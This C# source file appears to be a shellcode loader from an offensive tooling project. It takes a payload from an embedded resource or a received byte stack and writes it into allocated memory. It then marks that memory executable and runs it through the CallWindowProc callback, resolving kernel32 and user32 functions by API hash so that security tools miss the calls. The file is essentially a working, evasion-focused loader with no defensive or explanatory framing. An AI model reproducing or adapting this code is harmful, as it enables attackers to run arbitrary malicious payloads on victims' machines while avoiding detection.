using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;


namespace CallWinProCallBacK
{
    class Execute
    {
        public static byte[] buf;
        public static void exec()
        {
            if (GetCode.UseRaw == true)
            {
               buf = GetEmbeddedBin("dotnetlib");
            }
            else
            {
                //3d4f0f8e
                Stack<byte> recvStack = GetCode.CodeStack();
                buf = new byte[recvStack.Count];
                int payloadLen = recvStack.Count;
                for (int i = 0; i <= payloadLen; i++)
                {
                    try
                    {
                        buf[i] = recvStack.Pop();
                    }
                    catch { break; }

                }
            }
            IntPtr GetNeedDLL = Dinvoke.GetModuleAddress("kernel32.dll");
            IntPtr FuncAddr = Dinvoke.GetExpAddressByHASH(GetNeedDLL, @"3d4f0f8e");
            FuckAlloc FuckAlloc = (FuckAlloc)Marshal.GetDelegateForFunctionPointer(FuncAddr, typeof(FuckAlloc));
            IntPtr addr = FuckAlloc(0, buf.Length, 0x1000, 0x04);
            Marshal.Copy(buf, 0, addr, buf.Length);
            uint word;
            MYVIRTULProtect(addr, (UIntPtr)buf.Length, (uint)AllocationProtect.PAGE_EXECUTE, out word);
            FuckWindowProc(addr, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero);


        }


        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr FuckAlloc(UInt32 lpStartAddr, int size, UInt32 flAllocationType, UInt32 flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool CallWindowProc(IntPtr lpPrevWndFunc, IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        public static bool FuckWindowProc(IntPtr lpPrevWndFunc, IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam)
        {
            IntPtr wppointer = Dinvoke.GetExpAddressByHASH(Dinvoke.GetModuleAddress(@"user32.dll"), @"a3aea783");
            CallWindowProc callWindowProc = (CallWindowProc)Marshal.GetDelegateForFunctionPointer(wppointer, typeof(CallWindowProc));
            return callWindowProc(lpPrevWndFunc, hWnd, Msg, wParam, lParam);
        }



        public static bool MYVIRTULProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)
        {
            IntPtr vppointer = Dinvoke.GetExpAddressByHASH(Dinvoke.GetModuleAddress(@"kernel32.dll"), @"ad9f9cd0");
            MYVirtualProtect mytirtualProtect = (MYVirtualProtect)Marshal.GetDelegateForFunctionPointer(vppointer, typeof(MYVirtualProtect));
            return mytirtualProtect(lpAddress, dwSize, flNewProtect, out lpflOldProtect);

        }
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool MYVirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        public enum AllocationProtect : uint
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }
        //public static byte[] GetEmbeddedBin(string resourcesName) 
        //{

        //    var EmbeddedRes = Assembly.GetExecutingAssembly();

        //    using (var rs = EmbeddedRes.GetManifestResourceStream(resourcesName))
        //    {

        //        byte[] ba = new byte[rs.Length];
        //        // rs.Write(ba, 0, ba.Length);
        //        rs.Read(ba, 0, ba.Length);
        //        return ba;
        //    }

        //}

        public static byte[] GetEmbeddedBin(string resourcesName)
        {

            var EmbeddedRes = Assembly.GetExecutingAssembly();
            using (var rs = EmbeddedRes.GetManifestResourceStream(resourcesName))
            {
                if (rs != null)
                {
                    using (var ms = new MemoryStream())
                    {
                        rs.CopyTo(ms);
                        return ms.ToArray();
                    }
                }
                else
                {
                    return null;
                }

            }
        }
    }
}
